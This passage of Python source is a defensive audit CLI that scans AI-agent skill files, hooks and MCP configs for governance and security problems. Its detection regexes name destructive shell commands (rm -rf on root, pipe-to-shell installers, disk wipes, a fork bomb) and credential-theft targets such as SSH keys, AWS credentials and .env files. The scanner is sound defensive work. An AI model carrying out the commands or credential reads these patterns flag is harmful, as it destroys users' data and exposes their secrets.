#!/usr/bin/env python3
"""
agent_audit.py - deterministic agent-governance discovery and audit CLI.

This module is intentionally stdlib-only. It exposes reusable functions for
the MCP wrapper and a small CLI for local/CI use.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import stat as _stat
import subprocess
import sys
import tempfile
import unicodedata
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from functools import lru_cache
from pathlib import Path
from typing import Any

from build_index import FRONTMATTER_RE, parse_frontmatter


# Defaults below are overridable via the catalog's optional `config` block; see
# load_config(). Algorithms stay in code, policy data moves to configuration.
CLOSED_CATEGORIES = {"code-review", "docs", "testing", "governance", "discovery", "research", "delivery"}
CLOSED_TIERS = {"stable", "preview", "experimental", "internal"}
DEFAULT_THRESHOLDS = {
    "description_min": 80,
    "description_max": 1024,
    "body_budget": 500,
    "body_critical": 600,
}
DEFAULT_QUALITY_EXCLUDE = {"SKILL015"}
IGNORED_DIRS = {".git", ".skill-state", "out", "node_modules", "__pycache__"}
# Per-host install targets. Under these, `audit-project` skips the asset types an
# install *copies* (a duplicated AGENTS.md, vendored governance skills/agents) so a
# fresh install doesn't manufacture findings about the toolkit's own layout. It
# still audits SECURITY configs a user authors there (hooks in .claude/settings.json,
# .mcp.json, plugin.json) — those are real attack surface, never install noise.
# Opt back in fully with --include-install-dirs.
PER_HOST_INSTALL_DIRS = {".claude", ".codex", ".gemini", ".cursor"}
INSTALL_COPIED_ASSET_TYPES = {"instructions", "runtime-alias", "skill", "agent", "command", "prompt"}
SEVERITIES = {"high", "medium", "low", "info"}
SEVERITY_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3}
# Minimum severity for core safety/structural rules. A custom catalog may not
# weaken these below the floor — it stops a "downgrade-and-merge" gate bypass and
# guards against accidental weakening when an org tunes severities.
SEVERITY_FLOOR = {
    "SKILL001": "high",
    "SKILL002": "high",
    "SKILL009": "high",
    "SKILL014": "high",
    "SKILL015": "high",
    "SEC001": "high",
    "SEC002": "high",
    "SEC010": "high",
    "SEC011": "high",
    "REF002": "high",
    "SCR001": "high",
    "SCR002": "high",
    "SCR003": "high",
    "MCP001": "high",
    "HOOK001": "high",
    "HOOK002": "high",
}
# Upper bound on an org-supplied regex length — a coarse ReDoS / footgun guard.
MAX_PATTERN_LENGTH = 500
MAX_READ_BYTES = 1_000_000  # per-file cap for referenced/asset reads
ENGINE_RULE_IDS = {
    "DISC001",
    "DISC002",
    "SKILL001",
    "SKILL002",
    "SKILL003",
    "SKILL004",
    "SKILL005",
    "SKILL006",
    "SKILL007",
    "SKILL008",
    "SKILL009",
    "SKILL010",
    "SKILL011",
    "SKILL013",
    "SKILL014",
    "SKILL015",
    "SKILL016",
    "SKILL017",
    "SKILL018",
    "SKILL019",
    "SKILL020",
    "SKILL021",
    "SKILL022",
    "SKILL023",
    "SEC001",
    "SEC002",
    "SEC003",
    "SEC010",
    "SEC011",
    "SEC012",
    "MCP001",
    "MCP002",
    "REF001",
    "REF002",
    "REF003",
    "REF004",
    "SCR001",
    "SCR002",
    "SCR003",
    "HOOK001",
    "HOOK002",
    "IGNORE001",
    "IGNORE002",
    "IGNORE003",
}
SECURITY_PROFILE_RULE_IDS = {
    "SKILL001",
    "SKILL002",
    "SKILL005",
    "SKILL006",
    "SKILL007",
    "SKILL008",
    "SKILL009",
    "SKILL010",
    "SKILL014",
    "SKILL015",
    "SKILL016",
    "SKILL017",
    "SKILL023",
}


@dataclass(frozen=True)
class Finding:
    rule_id: str
    severity: str
    file: str
    line: int
    message: str
    suggestion: str


@dataclass(frozen=True)
class AgentAsset:
    type: str
    path: str
    relative_path: str
    lines: int
    bytes: int


DANGEROUS_PATTERNS: list[tuple[str, re.Pattern[str], str]] = [
    # Flags may come in any order/case and split across tokens (-rf / -fr / -r -f);
    # targets cover root, system top-level dirs, the home dir, and unquoted $VARs.
    # Deliberately NOT matched (false-positive budget): relative paths, /tmp,
    # and quoted "$VAR" cleanup idioms — this is a tripwire, not a boundary.
    ("rm -rf", re.compile(
        r"\brm\s+"
        r"(?=(?:-[-A-Za-z]+\s+)*-[A-Za-z]*[rR])"
        r"(?=(?:-[-A-Za-z]+\s+)*-[A-Za-z]*[fF])"
        r"(?:-[-A-Za-z]+\s+)+"
        r"(?:/(?:\s|$)"
        r"|/(?:etc|usr|var|home|Users|boot|bin|sbin|lib|lib64|opt|root|srv|System)(?:/\S*)?(?:\s|$)"
        r"|~(?:/\S*)?(?:\s|$)"
        r"|\$\{?[A-Za-z_][A-Za-z0-9_]*\b)"), "Avoid destructive deletion examples or require explicit confirmation."),
    ("sudo rm", re.compile(r"\bsudo\s+rm\b"), "Avoid privileged delete commands unless scoped and explicitly approved."),
    ("chmod 777", re.compile(r"\bchmod\s+(?:-[-A-Za-z]+\s+)*0?777\s+(?!/tmp\b)"), "Avoid world-writable permission guidance outside /tmp."),
    ("curl pipe shell", re.compile(r"\b(curl|wget)\b[^\n|]{0,120}\|\s*(?:sudo\s+)?(sh|bash|zsh|dash|ksh|fish)\b"), "Avoid pipe-to-shell installers."),
    ("eval argv", re.compile(r"\beval\s+(?:[\"']?\$@|\$\(|\"\$\{)"), "Avoid eval on user-controlled input."),
    ("disk wipe", re.compile(r"\bdd\s+if=/dev/(?:random|urandom|zero)\s+of=", re.I), "Avoid disk-wipe command patterns."),
    ("fork bomb", re.compile(r":\(\)\s*\{\s*:\|:\s*&\s*\}\s*;?\s*:"), "Do not include executable fork-bomb patterns."),
    ("block device write", re.compile(r">\s*/dev/(?:sd[a-z]|nvme\d+n\d+|disk\d+)"), "Avoid raw block-device writes."),
    ("git reset hard", re.compile(r"\bgit\s+reset\s+--hard\b"), "Do not normalize destructive git reset."),
    ("force push", re.compile(r"\bgit\s+push\b[^\n]{0,80}\s(?:--force|-f)\b"), "Avoid force push unless user explicitly approves."),
    ("approval bypass", re.compile(r"\b(bypass|skip|circumvent)\b[^\n]{0,80}\b(approval|sandbox|permission)s?\b", re.I), "Do not instruct agents to bypass approvals or sandboxes."),
]

SECRET_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("OpenAI-style token", re.compile(r"\bsk-[A-Za-z0-9]{20,}\b")),
    ("Anthropic token", re.compile(r"\bsk-ant-[A-Za-z0-9_-]{32,}\b")),
    ("Slack token", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("GitHub token", re.compile(r"\bghp_[A-Za-z0-9]{36}\b")),
    ("GitHub App token", re.compile(r"\bghs_[A-Za-z0-9]{36}\b")),
    ("AWS access key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("Google API key", re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b")),
    ("generic secret assignment", re.compile(r"\b(api[-_]?key|password|secret|token)\s*[:=]\s*[\"'][^\"']{8,}[\"']", re.I)),
    ("private key", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("Bearer token", re.compile(r"\bbearer\s+[A-Za-z0-9_\-.]{20,}\b", re.I)),
    ("credential path", re.compile(r"(\.aws/(?:credentials|config)|\.ssh/id_[a-z0-9_]+|\.gnupg/|\.gpg/|\.netrc|\.authinfo|\.kube/config|\.docker/config\.json|\.config/gh/hosts\.yml)", re.I)),
    ("env secret file read", re.compile(r"\b(?:cat|open|read|load|source)\s+(?:[./]*)\.env(?:\.[A-Za-z0-9_-]+)?\b", re.I)),
]


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def default_rules_path() -> Path:
    env_path = os.environ.get("AGENT_GOVERNANCE_RULES_PATH")
    if env_path:
        return Path(env_path).expanduser().resolve()

    script_root = Path(__file__).resolve().parents[1]
    candidate = script_root / "references" / "agent-audit-rules.json"
    if candidate.exists():
        return candidate

    return Path.cwd() / "references" / "agent-audit-rules.json"


def engine_version() -> str:
    """Toolkit version from the root VERSION file — stamped into reports for traceability."""
    try:
        return (Path(__file__).resolve().parents[1] / "VERSION").read_text(encoding="utf-8").strip()
    except OSError:
        return "unknown"


@lru_cache(maxsize=1)
def load_rule_catalog() -> dict[str, Any]:
    path = default_rules_path()
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError as exc:
        raise FileNotFoundError("Audit rule catalog not found") from exc
    except json.JSONDecodeError as exc:
        raise ValueError(f"Invalid audit rule catalog JSON: {exc}") from exc

    rules = payload.get("rules")
    if not isinstance(rules, list):
        raise ValueError("Audit rule catalog must contain a `rules` list")

    seen: set[str] = set()
    for index, rule in enumerate(rules):
        if not isinstance(rule, dict):
            raise ValueError(f"Rule entry #{index + 1} must be an object")
        rule_id = rule.get("rule_id")
        severity = rule.get("severity")
        if not isinstance(rule_id, str) or not rule_id:
            raise ValueError(f"Rule entry #{index + 1} has invalid rule_id")
        if rule_id in seen:
            raise ValueError(f"Duplicate audit rule id: {rule_id}")
        seen.add(rule_id)
        if severity not in SEVERITIES:
            raise ValueError(f"Rule {rule_id} has invalid severity: {severity}")
        floor = SEVERITY_FLOOR.get(rule_id)
        if floor and SEVERITY_RANK[severity] < SEVERITY_RANK[floor]:
            raise ValueError(f"Rule {rule_id} severity '{severity}' is below the required floor '{floor}'")
        for field in ("title", "description"):
            if not isinstance(rule.get(field), str) or not rule[field]:
                raise ValueError(f"Rule {rule_id} has invalid {field}")

    missing = sorted(ENGINE_RULE_IDS - seen)
    if missing:
        raise ValueError(f"Audit rule catalog missing required rule ids: {', '.join(missing)}")

    return {
        "version": payload.get("version", "unknown"),
        "path": as_posix(path),
        "rules": sorted(rules, key=lambda item: item["rule_id"]),
    }


def _deep_merge_config(base: dict[str, Any], overlay: dict[str, Any]) -> dict[str, Any]:
    """Recursively merge `overlay` into `base`. Dicts merge key-by-key; lists union
    (base + overlay-only items, order-preserving); every other value overrides."""
    merged = dict(base)
    for key, value in overlay.items():
        existing = merged.get(key)
        if isinstance(existing, dict) and isinstance(value, dict):
            merged[key] = _deep_merge_config(existing, value)
        elif isinstance(existing, list) and isinstance(value, list):
            merged[key] = existing + [item for item in value if item not in existing]
        else:
            merged[key] = value
    return merged


def _catalog_config_block() -> dict[str, Any]:
    """Read the optional `config` block from the catalog, tolerating absence.

    Sibling `references/audit-config.*.json` overlay files (sorted by name) are
    deep-merged in order: later files override scalars/dicts and union lists.
    """
    path = default_rules_path()
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError as exc:
        raise ValueError(f"Invalid audit rule catalog JSON: {exc}") from exc
    config = payload.get("config")
    config = config if isinstance(config, dict) else {}

    for overlay_path in sorted(path.parent.glob("audit-config.*.json")):
        try:
            data = json.loads(overlay_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as exc:
            raise ValueError(f"Invalid audit config overlay JSON in {overlay_path.name}: {exc}") from exc
        if isinstance(data, dict):
            overlay = data.get("config") if isinstance(data.get("config"), dict) else data
            config = _deep_merge_config(config, overlay)
    return config


def _compile_patterns(entries: Any, *, with_suggestion: bool) -> list[tuple[Any, ...]]:
    """Compile pattern entries from config into the engine's runtime tuples.

    Org-supplied regexes are validated: a bad pattern raises a clear ValueError
    (caught and sanitized by the CLI) instead of an opaque re.error mid-audit.
    """
    compiled: list[tuple[Any, ...]] = []
    for entry in entries or []:
        if not isinstance(entry, dict) or "regex" not in entry:
            continue
        label = str(entry.get("label", entry["regex"]))
        regex = str(entry["regex"])
        if len(regex) > MAX_PATTERN_LENGTH:
            raise ValueError(f"Config pattern '{label}' exceeds the {MAX_PATTERN_LENGTH}-character limit.")
        flags = re.I if entry.get("ignore_case") else 0
        try:
            pattern = re.compile(regex, flags)
        except re.error as exc:
            raise ValueError(f"Config pattern '{label}' has an invalid regex: {exc}") from exc
        if with_suggestion:
            compiled.append((label, pattern, str(entry.get("suggestion", "Review this instruction for safety."))))
        else:
            compiled.append((label, pattern))
    return compiled


def _validate_thresholds(raw: Any) -> dict[str, int]:
    """Coerce/validate config thresholds — each must be a positive integer."""
    if raw is None:
        return {}
    if not isinstance(raw, dict):
        raise ValueError("Config `thresholds` must be an object.")
    validated: dict[str, int] = {}
    for key, value in raw.items():
        if isinstance(value, bool) or not isinstance(value, int) or value <= 0:
            raise ValueError(f"Config threshold '{key}' must be a positive integer, got {value!r}.")
        validated[str(key)] = value
    return validated


@lru_cache(maxsize=1)
def load_config() -> dict[str, Any]:
    """Resolve audit policy data: built-in defaults merged with the catalog's
    optional `config` block. Thresholds/profiles override; vocab/patterns extend."""
    raw = _catalog_config_block()

    thresholds = {**DEFAULT_THRESHOLDS, **_validate_thresholds(raw.get("thresholds"))}

    vocab = raw.get("vocabularies") or {}
    categories = CLOSED_CATEGORIES | {str(c) for c in (vocab.get("categories") or [])}
    tiers = CLOSED_TIERS | {str(t) for t in (vocab.get("tiers") or [])}

    profiles = raw.get("profiles") or {}
    security = set(profiles["security"]) if profiles.get("security") else set(SECURITY_PROFILE_RULE_IDS)
    quality_exclude = (
        set(profiles["quality_exclude"]) if profiles.get("quality_exclude") is not None else set(DEFAULT_QUALITY_EXCLUDE)
    )

    patterns = raw.get("patterns") or {}
    dangerous = list(DANGEROUS_PATTERNS) + _compile_patterns(patterns.get("dangerous"), with_suggestion=True)
    secrets = list(SECRET_PATTERNS) + _compile_patterns(patterns.get("secrets"), with_suggestion=False)

    DEFAULT_UNICODE_SCRIPTS = {"Latin", "Common"}
    allow = raw.get("allowlists") or {}
    hooks_cfg = raw.get("hooks") or {}

    return {
        "thresholds": thresholds,
        "categories": categories,
        "tiers": tiers,
        "security_profile": security,
        "quality_exclude": quality_exclude,
        "dangerous_patterns": dangerous,
        "secret_patterns": secrets,
        "allow_domains": {str(d).lower() for d in (allow.get("domains") or [])},
        "allow_unicode_scripts": DEFAULT_UNICODE_SCRIPTS | {str(s) for s in (allow.get("unicode_scripts") or [])},
        "allow_mcp_servers": {str(s) for s in (allow.get("mcp_servers") or [])},
        "env_exfil_patterns": _compile_patterns(patterns.get("env_exfil"), with_suggestion=True),
        "hook_deny": _compile_patterns(hooks_cfg.get("deny"), with_suggestion=True),
        "scripts_manifest": str((raw.get("scripts") or {}).get("manifest", "scripts/runtime-manifest.txt")),
    }


def rules_by_id() -> dict[str, dict[str, str]]:
    return {rule["rule_id"]: rule for rule in load_rule_catalog()["rules"]}


def enrich_findings(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Annotate each finding dict with the catalog `title` and `rationale`.

    Additive only — the dict keeps `rule_id, severity, file, line, message,
    suggestion` and gains `title` (catalog title) + `rationale` (catalog
    description), so a report reader sees WHAT the rule is and WHY it exists.
    A finding whose rule_id is absent from the catalog (shouldn't happen) is
    left untouched. `finding_key` ignores both fields, so delta identity is
    unchanged.
    """
    catalog = rules_by_id()
    for f in findings:
        rule = catalog.get(f.get("rule_id"))
        if rule is None:
            continue
        f["title"] = rule["title"]
        f["rationale"] = rule["description"]
    return findings


def as_posix(path: Path) -> str:
    return str(path).replace("\\", "/")


def rel_to(path: Path, root: Path) -> str:
    try:
        return as_posix(path.relative_to(root))
    except ValueError:
        return as_posix(path)


def should_skip(path: Path) -> bool:
    return any(part in IGNORED_DIRS for part in path.parts)


def install_dir_for(path: Path, root: Path) -> str | None:
    """The per-host install dir a path lives under (relative to root), or None."""
    try:
        parts = path.resolve().relative_to(root.resolve()).parts
    except (OSError, ValueError):
        return None
    return parts[0] if parts and parts[0] in PER_HOST_INSTALL_DIRS else None


def is_within_root(path: Path, root: Path) -> bool:
    try:
        path.resolve().relative_to(root.resolve())
        return True
    except (OSError, ValueError):
        return False


def read_text(path: Path) -> str:
    return path.read_text(encoding="utf-8", errors="replace")


def line_for_offset(text: str, offset: int) -> int:
    return text.count("\n", 0, offset) + 1


def line_for_regex(text: str, pattern: str, flags: int = 0) -> int:
    match = re.search(pattern, text, flags)
    if not match:
        return 1
    return line_for_offset(text, match.start())


def line_for_body_regex(full_text: str, body: str, pattern: str, flags: int = 0) -> int:
    match = re.search(pattern, body, flags)
    if not match:
        return 1
    body_offset = full_text.find(body)
    if body_offset < 0:
        body_offset = 0
    return line_for_offset(full_text, body_offset + match.start())


def line_text_for_offset(text: str, offset: int) -> str:
    start = text.rfind("\n", 0, offset) + 1
    end = text.find("\n", offset)
    if end < 0:
        end = len(text)
    return text[start:end]


def is_detection_context(line: str) -> bool:
    return bool(re.search(r"\b(detect|flag|scan|sweep|regex|pattern|anti-pattern|allowlist|denylist)\b", line, re.I))


def has_skill_type_tag(body: str) -> bool:
    return bool(re.search(r"Skill type:\**\s*(?:Detect-only|MUTATING|Mutating)", body, re.I))


def has_ask_user_policy(body: str) -> bool:
    return bool(
        re.search(r"Clarification policy", body, re.I)
        or re.search(r"AskUserQuestion policy", body, re.I)
        or re.search(r"No `?AskUserQuestion`?\b", body, re.I)
        or re.search(r"All AskUserQuestion calls are scoped", body, re.I)
    )


def has_user_prompt_language(body: str) -> bool:
    prompt_patterns = [
        r"\bAskUserQuestion\b",
        r"\bask the user\b",
        r"\bask whether\b",
        r"\botherwise ask\b",
        r"\bthen ask\b",
        r"\bprompts? via AskUserQuestion\b",
    ]
    return any(re.search(pattern, body, re.I) for pattern in prompt_patterns)


def has_never_asks_contract(body: str) -> bool:
    return bool(re.search(r"\bnever asks?\b", body, re.I))


def is_mutating_skill(body: str) -> bool:
    return bool(re.search(r"Skill type:\**\s*(?:MUTATING|Mutating)", body, re.I))


# Workflow-relationship prose: the skill describes running before/after a peer,
# hands off TO one, or replaces/is-replaced. Directional/relational phrasing only —
# the bare nouns "handoff"/"predecessor"/"successor"/"next skill" were dropped
# because a skill that merely *discusses* handoffs (a meta-skill, docs) is not
# itself chained. Case-insensitive; SKILL020 chain signal.
_CHAIN_BODY_RE = re.compile(
    r"\b(runs? (?:after|before) the|replaces the|replaced by|hands? off to|"
    r"this skill'?s (?:predecessor|successor))\b",
    re.I,
)


def _has_chain_signal(fm: dict[str, Any], body: str) -> bool:
    """True when a skill participates in a workflow chain — the only case where a
    missing Predecessor/Successor contract (SKILL020) is a real defect.

    Signals (any one suffices):
    - a top-level `handoffs:` frontmatter key (declares named transitions to peers),
    - `metainfo.replaced_by` or `metainfo.deprecated` set (replacement relationship),
    - workflow-relationship prose in the body (handoff / before-after / replaces).
    A standalone skill exhibits none of these and is exempt.
    """
    if isinstance(fm, dict):
        if fm.get("handoffs"):
            return True
        metainfo = fm.get("metainfo")
        if isinstance(metainfo, dict) and (metainfo.get("replaced_by") or metainfo.get("deprecated")):
            return True
    return bool(_CHAIN_BODY_RE.search(body))


def finding(rule_id: str, file: Path, line: int, message: str, suggestion: str) -> Finding:
    rules = rules_by_id()
    if rule_id not in rules:
        raise KeyError(f"Unknown audit rule id used by engine: {rule_id}")
    return Finding(
        rule_id=rule_id,
        severity=rules[rule_id]["severity"],
        file=as_posix(file),
        line=max(1, line),
        message=message,
        suggestion=suggestion,
    )


def asset_type(path: Path, root: Path) -> str | None:
    rel = rel_to(path, root)
    name = path.name
    if name == "AGENTS.md":
        return "instructions"
    if name in {"CLAUDE.md", "GEMINI.md"} or rel == ".github/copilot-instructions.md":
        return "runtime-alias"
    if name == "SKILL.md" and "skills" in path.parts:
        return "skill"
    if path.parent.name == "agents" and path.suffix == ".md":
        return "agent"
    if path.parent.name == "commands" and path.suffix == ".md":
        return "command"
    if "prompts" in path.parts and path.suffix in {".md", ".txt", ".yaml", ".yml", ".json"}:
        return "prompt"
    if name in {".mcp.json", "mcp.json"}:
        return "mcp-config"
    if name == "plugin.json" and path.parent.name.endswith("-plugin"):
        return "plugin-config"
    if name == "gemini-extension.json":
        return "runtime-config"
    # Hooks: Claude Code settings files carry a `hooks` block, and any file directly
    # under a `hooks/` directory is a hook script (executed on tool events).
    if name in {"settings.json", "settings.local.json"} and path.parent.name == ".claude":
        return "hook"
    if path.parent.name == "hooks":
        return "hook"
    return None


def discover_agent_assets(root: str | Path = ".", *, include_install_dirs: bool = True) -> dict[str, Any]:
    root_path = Path(root).expanduser().resolve()
    assets: list[AgentAsset] = []
    skipped_install_dirs: set[str] = set()
    if not root_path.exists():
        raise FileNotFoundError(f"Root not found: {root_path}")

    for path in sorted(root_path.rglob("*")):
        if should_skip(path) or not path.is_file():
            continue
        if not is_within_root(path, root_path):
            continue
        kind = asset_type(path, root_path)
        if kind is None:
            continue
        # Skip install-copied governance content under a per-host dir, but keep
        # auditing security configs (hooks / mcp-config / plugin-config) there.
        if not include_install_dirs and kind in INSTALL_COPIED_ASSET_TYPES:
            host_dir = install_dir_for(path, root_path)
            if host_dir is not None:
                skipped_install_dirs.add(host_dir)
                continue
        try:
            text = read_text(path)
            line_count = len(text.splitlines())
        except OSError:
            line_count = 0
        try:
            size = path.stat().st_size
        except OSError:
            size = 0
        assets.append(AgentAsset(kind, as_posix(path), rel_to(path, root_path), line_count, size))

    counts: dict[str, int] = {}
    for asset in assets:
        counts[asset.type] = counts.get(asset.type, 0) + 1

    return {
        "root": as_posix(root_path),
        "generated_at": utc_now(),
        "counts": counts,
        "assets": [asdict(asset) for asset in assets],
        "skipped_install_dirs": sorted(skipped_install_dirs),
    }


def body_without_frontmatter(text: str) -> str:
    return FRONTMATTER_RE.sub("", text, count=1)


def frontmatter_text(text: str) -> str:
    match = FRONTMATTER_RE.match(text)
    return match.group(1) if match else ""


def audit_skill(path: str | Path, profile: str = "release-ready", root: str | Path | None = None) -> dict[str, Any]:
    skill_path = Path(path).expanduser().resolve()
    text = read_text(skill_path)
    body = body_without_frontmatter(text)
    fm_text = frontmatter_text(text)
    fm = parse_frontmatter(text)
    findings: list[Finding] = []
    cfg = load_config()
    thresholds = cfg["thresholds"]
    categories_vocab = cfg["categories"]
    tiers_vocab = cfg["tiers"]

    if fm is None:
        findings.append(
            finding("SKILL001", skill_path, 1, "SKILL.md has no YAML frontmatter.", "Add frontmatter with at least name and description.")
        )
        fm = {}

    for field in ("name", "description"):
        if not fm.get(field):
            line = 1 if not fm_text else line_for_regex(fm_text, rf"^{field}\s*:", re.M) or 1
            findings.append(
                finding("SKILL002", skill_path, line, f"Missing required `{field}` frontmatter field.", f"Add `{field}:` to the SKILL.md frontmatter.")
            )

    description = fm.get("description")
    if isinstance(description, str):
        desc_min = thresholds["description_min"]
        desc_max = thresholds["description_max"]
        if len(description) < desc_min:
            findings.append(
                finding("SKILL003", skill_path, line_for_regex(fm_text, r"^description\s*:", re.M), f"Description is under {desc_min} characters.", "Add 2-5 concrete trigger phrases and the main outcome.")
            )
        if len(description) > desc_max:
            findings.append(
                finding("SKILL004", skill_path, line_for_regex(fm_text, r"^description\s*:", re.M), f"Description exceeds {desc_max} characters.", "Shorten it without removing critical trigger phrases.")
            )

    if "compatibility" not in fm:
        findings.append(
            finding("SKILL005", skill_path, 1, "Missing `compatibility:` frontmatter field.", "Declare supported runtimes in `compatibility:`.")
        )
    if "license" not in fm:
        findings.append(
            finding("SKILL006", skill_path, 1, "Missing `license:` frontmatter field.", "Declare the skill license in `license:`.")
        )

    metainfo = fm.get("metainfo")
    if not isinstance(metainfo, dict):
        findings.append(
            finding("SKILL007", skill_path, 1, "Missing `metainfo:` block.", "Add `metainfo.category` and `metainfo.tier`.")
        )
    else:
        categories = metainfo.get("category")
        tier = metainfo.get("tier")
        if not categories:
            findings.append(
                finding("SKILL007", skill_path, line_for_regex(fm_text, r"^metainfo\s*:", re.M), "Missing `metainfo.category`.", f"Use one or more of: {', '.join(sorted(categories_vocab))}.")
            )
        else:
            cat_list = categories if isinstance(categories, list) else [categories]
            invalid = [str(cat) for cat in cat_list if str(cat) not in categories_vocab]
            if invalid:
                findings.append(
                    finding("SKILL008", skill_path, line_for_regex(fm_text, r"category\s*:", re.M), f"Invalid metainfo.category value(s): {', '.join(invalid)}.", f"Use only: {', '.join(sorted(categories_vocab))}.")
                )
        if not tier:
            findings.append(
                finding("SKILL007", skill_path, line_for_regex(fm_text, r"^metainfo\s*:", re.M), "Missing `metainfo.tier`.", f"Use one of: {', '.join(sorted(tiers_vocab))}.")
            )
        elif str(tier) not in tiers_vocab:
            findings.append(
                finding("SKILL008", skill_path, line_for_regex(fm_text, r"tier\s*:", re.M), f"Invalid metainfo.tier value: {tier}.", f"Use one of: {', '.join(sorted(tiers_vocab))}.")
            )

    if "allowed-tools" in fm:
        findings.append(
            finding("SKILL009", skill_path, line_for_regex(fm_text, r"^allowed-tools\s*:", re.M), "`allowed-tools:` appears in frontmatter.", "Remove it and document tool restrictions in the body as guidance.")
        )

    host_only_fields = [
        "type",
        "status",
        "last_updated",
        "last_verified",
        "paths",
        "hooks",
        "model",
        "effort",
        "context",
        "disable-model-invocation",
        "user-invocable",
        "argument-hint",
        "arguments",
        "when_to_use",
        "shell",
    ]
    for field in host_only_fields:
        if field in fm:
            findings.append(
                finding("SKILL010", skill_path, line_for_regex(fm_text, rf"^{re.escape(field)}\s*:", re.M), f"Tool-specific frontmatter field `{field}:` detected.", "Move host-specific behavior into body guidance or repo-level runtime mapping.")
            )

    body_lines = body.splitlines()
    body_budget = thresholds["body_budget"]
    body_critical = thresholds["body_critical"]
    if len(body_lines) > body_critical:
        message = f"Skill body has {len(body_lines)} lines, above the critical {body_critical}-line threshold."
    elif len(body_lines) > body_budget:
        message = f"Skill body has {len(body_lines)} lines, above the {body_budget}-line portability budget."
    else:
        message = ""
    if message:
        findings.append(
            finding("SKILL011", skill_path, 1, message, "Move long details to references/, executable logic to scripts/, and static templates to assets/.")
        )

    # SKILL012 (missing `## When to use`) retired in rules 0.5.0 — the body
    # activation section is optional; exclusion triggers belong in `description`
    # and hard rules in AGENTS.md. See docs/skill-authoring-standard.md.

    if not re.search(r"\b(verify|verification|test|audit|check|render|preview|validate)\b", body, re.I):
        findings.append(
            finding("SKILL013", skill_path, 1, "No explicit verification guidance detected.", "Add concrete verification steps or acceptance criteria.")
        )

    if not has_skill_type_tag(body):
        findings.append(
            finding("SKILL021", skill_path, 1, "Missing required `Skill type` declaration near the top of the skill body.", "Add `> **Skill type:** Detect-only ...` or `> **Skill type:** MUTATING ...` near the title.")
        )

    if has_user_prompt_language(body) and not has_ask_user_policy(body):
        findings.append(
            finding("SKILL022", skill_path, line_for_body_regex(text, body, r"(AskUserQuestion|ask the user|ask whether|otherwise ask|then ask)", re.I), "Skill can prompt the user but lacks an explicit clarification policy.", "Add a Hard rules bullet limiting exactly when user prompts are allowed, or remove the prompt path.")
        )
    if has_never_asks_contract(body) and re.search(r"\b(ask the user|ask whether|otherwise ask|then ask)\b", body, re.I):
        findings.append(
            finding("SKILL022", skill_path, line_for_body_regex(text, body, r"\b(ask the user|ask whether|otherwise ask|then ask)\b", re.I), "Skill says it never asks but also contains user-prompt language.", "Make the skill fully non-interactive or replace `never asks` with a precise clarification policy.")
        )

    if is_mutating_skill(body):
        missing_controls: list[str] = []
        if not re.search(r"\b(preview|dry-run|diff)\b", body, re.I):
            missing_controls.append("preview/dry-run/diff")
        if not re.search(r"\b(confirm|confirmation|AskUserQuestion)\b", body, re.I):
            missing_controls.append("confirmation gate")
        if not re.search(r"\b(verify|verification|re-audit|idempotent)\b", body, re.I):
            missing_controls.append("post-write verification")
        if not re.search(r"\b(write|modify|inject|install|overwrite|OUTPUT_MODE|marker)\b", body, re.I):
            missing_controls.append("write scope")
        if missing_controls:
            findings.append(
                finding("SKILL023", skill_path, line_for_body_regex(text, body, r"Skill type:\**\s*(?:MUTATING|Mutating)", re.I), f"Mutating skill contract is missing: {', '.join(missing_controls)}.", "Document preview, confirmation, verification, and exact mutation scope for every mutating skill.")
            )

    for label, pattern, suggestion in cfg["dangerous_patterns"]:
        for match in pattern.finditer(text):
            if is_detection_context(line_text_for_offset(text, match.start())):
                continue
            findings.append(
                finding("SKILL014", skill_path, line_for_offset(text, match.start()), f"Potentially dangerous instruction detected: {label}.", suggestion)
            )

    for label, pattern in cfg["secret_patterns"]:
        for match in pattern.finditer(text):
            if is_detection_context(line_text_for_offset(text, match.start())):
                continue
            findings.append(
                finding("SKILL015", skill_path, line_for_offset(text, match.start()), f"Potential secret or credential reference detected: {label}.", "Remove inline secrets and refer to environment variable names only.")
            )

    trust_pattern = re.compile(r"\b(trust|follow|obey|execute)\b[^\n]{0,80}\b(web|email|external|project file|project files|document|docs)\b", re.I)
    for match in trust_pattern.finditer(body):
        findings.append(
            finding("SKILL016", skill_path, line_for_offset(text, text.find(body) + match.start()), "External/project content appears to be trusted too broadly.", "State that external content is data unless verified by trusted project instructions.")
        )

    path_pattern = re.compile(r"(/Users/[A-Za-z0-9._-]+|/home/[A-Za-z0-9._-]+|[A-Za-z]:\\\\Users\\\\[A-Za-z0-9._-]+)")
    for match in path_pattern.finditer(body):
        findings.append(
            finding("SKILL017", skill_path, line_for_offset(text, text.find(body) + match.start()), "Hardcoded local user path detected.", "Replace local paths with repo-relative paths or input parameters.")
        )

    # SKILL018 fires on actual sub-agent DISPATCH (backticked `Task`, "Task tool",
    # `Task(`, "sub-agent", or "dispatch … agent/task"), not the bare word "Task"
    # in prose ("## Task breakdown", "the first task"). Mention ≠ requirement.
    dispatch_pattern = r"`Task`|\bTask tool\b|\bTask\(|\bsub-?agents?\b|\bdispatch\w*\b[^.\n]{0,30}\b(?:agent|task)"
    if re.search(dispatch_pattern, body, re.I) and not re.search(r"\b(fallback|linear|sequential|inline)\b", body, re.I):
        findings.append(
            finding("SKILL018", skill_path, line_for_body_regex(text, body, dispatch_pattern, re.I), "`Task` or sub-agent dispatch appears without a sequential fallback.", "Document the linear/manual fallback and ensure sub-agent dispatch is optional, not required for correctness.")
        )

    # Overbroad = unbounded scope claims, NOT scoped defensive prose like "always
    # handle errors" or "handle all rows in the batch". Dropped "always handle" /
    # "all tasks" (too many legitimate scoped uses).
